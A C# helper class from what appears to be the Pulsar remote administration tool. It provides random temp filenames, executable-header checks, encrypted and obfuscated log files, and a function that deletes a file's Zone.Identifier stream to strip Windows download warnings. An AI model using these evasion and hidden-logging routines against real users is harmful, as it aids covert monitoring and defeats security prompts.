using Pulsar.Common.Cryptography;
using System;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Pulsar.Common.Helpers
{
    public static class FileHelper
    {
        private static readonly char[] IllegalPathChars = Path.GetInvalidPathChars().Union(Path.GetInvalidFileNameChars()).ToArray();

        public static bool HasIllegalCharacters(string path) => path.Any(c => IllegalPathChars.Contains(c));

        public static string GetRandomFilename(int length, string extension = "") =>
            string.Concat(StringHelper.GetRandomString(length), extension);

        public static string GetTempFilePath(string extension = "")
        {
            string tempFilePath;
            do
            {
                tempFilePath = Path.Combine(Path.GetTempPath(), GetRandomFilename(12, extension));
            } while (File.Exists(tempFilePath));

            return tempFilePath;
        }

        public static bool HasExecutableIdentifier(byte[] binary)
        {
            if (binary.Length < 2) return false;
            return (binary[0] == 'M' && binary[1] == 'Z') || (binary[0] == 'Z' && binary[1] == 'M');
        }

        public static bool DeleteZoneIdentifier(string filePath) => NativeMethods.DeleteFile(filePath + ":Zone.Identifier");

        #region AES Log

        public static void WriteLogFile(string filename, string appendText, Aes256 aes)
        {
            appendText = ReadLogFile(filename, aes) + appendText;
            FileStream fStream = null;
            try
            {
                fStream = File.Open(filename, FileMode.Create, FileAccess.Write);
                byte[] data = aes.Encrypt(Encoding.UTF8.GetBytes(appendText));
                fStream.Write(data, 0, data.Length);
                fStream.Flush(true);
            }
            finally
            {
                if (fStream != null) fStream.Dispose();
            }
        }

        public static string ReadLogFile(string filename, Aes256 aes) =>
            File.Exists(filename) ? Encoding.UTF8.GetString(aes.Decrypt(File.ReadAllBytes(filename))) : string.Empty;

        #endregion

        #region Obfuscated Log - Sync

        public static void WriteObfuscatedLogFile(string filename, string appendText)
        {
            if (string.IsNullOrEmpty(filename)) throw new ArgumentNullException(nameof(filename));
            if (appendText == null) appendText = string.Empty;

            byte[] compressed = CompressGzip(Encoding.UTF8.GetBytes(appendText));
            byte[] obfBytes = ByteRotationObfuscator.Obfuscate(compressed);

            string dir = Path.GetDirectoryName(filename);
            if (!string.IsNullOrEmpty(dir) && !Directory.Exists(dir))
                Directory.CreateDirectory(dir);

            FileStream fs = null;
            BinaryWriter bw = null;
            try
            {
                fs = File.Open(filename, FileMode.Append, FileAccess.Write, FileShare.Read);
                bw = new BinaryWriter(fs, Encoding.UTF8);
                bw.Write(obfBytes.Length);
                bw.Write(obfBytes);
                bw.Flush();
                fs.Flush(true);
            }
            catch
            {
                // ignore errors
            }
            finally
            {
                if (bw != null) bw.Dispose();
                if (fs != null) fs.Dispose();
            }
        }

        public static string ReadObfuscatedLogFile(string filename)
        {
            if (string.IsNullOrEmpty(filename) || !File.Exists(filename)) return string.Empty;

            try
            {
                byte[] allBytes = File.ReadAllBytes(filename);
                if (allBytes.Length == 0) return string.Empty;

                MemoryStream ms = null;
                BinaryReader br = null;
                try
                {
                    ms = new MemoryStream(allBytes);
                    br = new BinaryReader(ms, Encoding.UTF8);
                    var sb = new StringBuilder();
                    bool framed = true;

                    while (ms.Position < ms.Length)
                    {
                        if (ms.Length - ms.Position < 4) { framed = false; break; }

                        int len = br.ReadInt32();
                        if (len < 0 || len > ms.Length - ms.Position) { framed = false; break; }

                        byte[] chunk = br.ReadBytes(len);
                        if (chunk.Length == 0) continue;

                        byte[] deob = ByteRotationObfuscator.Deobfuscate(chunk);
                        sb.Append(DecompressIfGzip(deob));
                    }

                    if (framed) return sb.ToString();
                }
                finally
                {
                    if (br != null) br.Dispose();
                    if (ms != null) ms.Dispose();
                }
            }
            catch { }

            // fallback: legacy single-block
            try
            {
                byte[] obfAll = File.ReadAllBytes(filename);
                byte[] deobAll = ByteRotationObfuscator.Deobfuscate(obfAll);
                return DecompressIfGzip(deobAll);
            }
            catch { return string.Empty; }
        }

        #endregion

        #region Obfuscated Log - Async

        public static Task WriteObfuscatedLogFileAsync(string filename, string appendText) =>
            Task.Run(() => WriteObfuscatedLogFile(filename, appendText));

        public static Task<string> ReadObfuscatedLogFileAsync(string filename, int maxRetries = 3)
        {
            return Task.Run(() =>
            {
                for (int i = 0; i < maxRetries; i++)
                {
                    try
                    {
                        return FileHelper.ReadObfuscatedLogFile(filename);
                    }
                    catch (IOException)
                    {
                        if (i < maxRetries - 1)
                            Task.Delay(50).Wait();
                    }
                }
                return string.Empty;
            });
        }

        #endregion

        #region Compression Helpers

        private static string DecompressIfGzip(byte[] data)
        {
            try
            {
                if (data.Length >= 2 && data[0] == 0x1F && data[1] == 0x8B)
                    return Encoding.UTF8.GetString(DecompressGzipToBytes(data));
                return Encoding.UTF8.GetString(data);
            }
            catch { return Encoding.UTF8.GetString(data); }
        }

        private static byte[] DecompressGzipToBytes(byte[] compressed)
        {
            MemoryStream input = null;
            GZipStream gzip = null;
            MemoryStream output = null;
            try
            {
                input = new MemoryStream(compressed);
                gzip = new GZipStream(input, CompressionMode.Decompress);
                output = new MemoryStream();
                gzip.CopyTo(output);
                return output.ToArray();
            }
            finally
            {
                if (gzip != null) gzip.Dispose();
                if (input != null) input.Dispose();
                if (output != null) output.Dispose();
            }
        }

        private static byte[] CompressGzip(byte[] data)
        {
            MemoryStream output = null;
            GZipStream gzip = null;
            try
            {
                output = new MemoryStream();
                gzip = new GZipStream(output, CompressionLevel.Optimal, true);
                gzip.Write(data, 0, data.Length);
                gzip.Close();
                return output.ToArray();
            }
            catch { return data; }
            finally
            {
                if (gzip != null) gzip.Dispose();
                if (output != null) output.Dispose();
            }
        }

        #endregion
    }
}
